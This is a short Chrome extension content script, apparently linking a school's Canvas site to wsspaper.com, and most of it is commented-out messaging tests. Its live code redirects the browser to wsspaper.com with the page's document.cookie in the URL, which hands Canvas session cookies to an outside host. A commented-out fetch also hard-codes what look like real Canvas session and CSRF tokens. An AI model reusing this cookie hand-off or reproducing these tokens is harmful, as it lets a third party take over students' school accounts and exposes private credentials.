// chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
//     if (message === 'get-cookies') {
//         sendResponse("document.cookie")
//     }
// });

// chrome.runtime.onConnect.addListener(function (port) {
//     console.log("connected");
//     console.assert(port.name === "cookies");
//     port.onMessage.addListener(function (msg) {
//         if (msg.sendBack === "cookie")
//             port.postMessage({ answer: cook });
//         console.log(msg);
//         console.log("alskdjfl;");
//     });
// });

// chrome.runtime.sendMessage("test", function (response) {
//     console.log(response);
// });


// chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
//     if (message === 'test') {
//         sendResponse("cook")
//     }
// });


chrome.runtime.sendMessage("get-current-tab", function (response) {
    // fetch("https://iowacityschools.instructure.com:443/api/v1/courses/74570/assignments?include[]=submission&bucket=past",
    //     {
    //         headers:
    //             { "Cookie": "_csrf_token=Wdu3Cb%2BmSk3CXX2kha2o0t618IO77Mb4B7RkTwPK5dkfqcQ%2BlJc%2FHa0TEf3cx%2FHj6Yah0%2FiYssE%2B9hZ4O%2F%2Bjng%3D%3D; log_session_id=125ed0222e9c4ffe88e86492553b9457; _hp2_id.3001039959=%7B%22userId%22%3A%225234708163055606%22%2C%22pageviewId%22%3A%221881513844972880%22%2C%22sessionId%22%3A%222503616967007358%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D; _hp2_ses_props.3001039959=%7B%22r%22%3A%22https%3A%2F%2Faccounts.google.com%2F%22%2C%22ts%22%3A1672448541464%2C%22d%22%3A%22iowacityschools.instructure.com%22%2C%22h%22%3A%22%2F%22%7D; _legacy_normandy_session=gD0lO9LyKy2bQ3AhDsGsPw+YWlSShh3EmqxP4u06KmddEkVa4Iuz3-sPIdKW7VUFmInCdczCzG2V5EZvB9yMBtxaWLquGINUmR-swHF3l-kw6p0Es38kLKBVJmW_5JkKcL6zQvR7oyWQ4398O4-FQGLK_36FAozycSnXIjo35dWOSF_5Ok67fWsKN0UWln1YqMRLi6nXAOEmfa444YdeH_3j3jOgodr2keysSorhZu5UVM_3GvvKR-1T0JGHK7J5gzK1CCbzcQnfHFM6pJRc4e4P93iKgI-bl4eA9CSqUB5NalJMqLw1g73CofBySuzZLVorfFF70nu2mzKnxtegrGKtRqg1dPAZBlkolN4PTxTO2PvoU082G6UHF8xGM0poQt80ic5acXxSm-u2jN883v5cmuC9JY2EHvg0jjxd3kQG_RptahiHawjlAZuJCC6gi6w0kOw48iDCin4AqAdhldYum2BksBchv2LLIPxBgM4IMuGpHPuTHkosHvxST4mEiXKCAs3NuVqswlQJSq5IfvMXdvStTk9MfDTGAf-uEfZJOKWyhZtPFkkc-xzF3a5y4ls1vBqWdiLZY6alvkohLEGSwnyTAJVjSVUdBqtkmpr2g.EIN0j1-jLsA61l-c0w0LM2i1yMI.Y6-L5Q; canvas_session=gD0lO9LyKy2bQ3AhDsGsPw+YWlSShh3EmqxP4u06KmddEkVa4Iuz3-sPIdKW7VUFmInCdczCzG2V5EZvB9yMBtxaWLquGINUmR-swHF3l-kw6p0Es38kLKBVJmW_5JkKcL6zQvR7oyWQ4398O4-FQGLK_36FAozycSnXIjo35dWOSF_5Ok67fWsKN0UWln1YqMRLi6nXAOEmfa444YdeH_3j3jOgodr2keysSorhZu5UVM_3GvvKR-1T0JGHK7J5gzK1CCbzcQnfHFM6pJRc4e4P93iKgI-bl4eA9CSqUB5NalJMqLw1g73CofBySuzZLVorfFF70nu2mzKnxtegrGKtRqg1dPAZBlkolN4PTxTO2PvoU082G6UHF8xGM0poQt80ic5acXxSm-u2jN883v5cmuC9JY2EHvg0jjxd3kQG_RptahiHawjlAZuJCC6gi6w0kOw48iDCin4AqAdhldYum2BksBchv2LLIPxBgM4IMuGpHPuTHkosHvxST4mEiXKCAs3NuVqswlQJSq5IfvMXdvStTk9MfDTGAf-uEfZJOKWyhZtPFkkc-xzF3a5y4ls1vBqWdiLZY6alvkohLEGSwnyTAJVjSVUdBqtkmpr2g.EIN0j1-jLsA61l-c0w0LM2i1yMI.Y6-L5Q; _mkto_trk_http=id:449-BVJ-543&token:_mch-instructure.com-1661206502756-80395" }
    //     })
    //     .then((response) => {
    //         console.log(response.json());
    //     })

    if (response.url.includes("iowacityschools.instructure.com")) {

        if (response.url.includes("coming_from=wsspaper_canvas_wrapped")) {
            window.location.replace(`https://wsspaper.com/?c_tkn=${document.cookie}`)
        }

        // chrome.runtime.sendMessage(cook, function (response) {
        //     // pass
        // });

    }

});
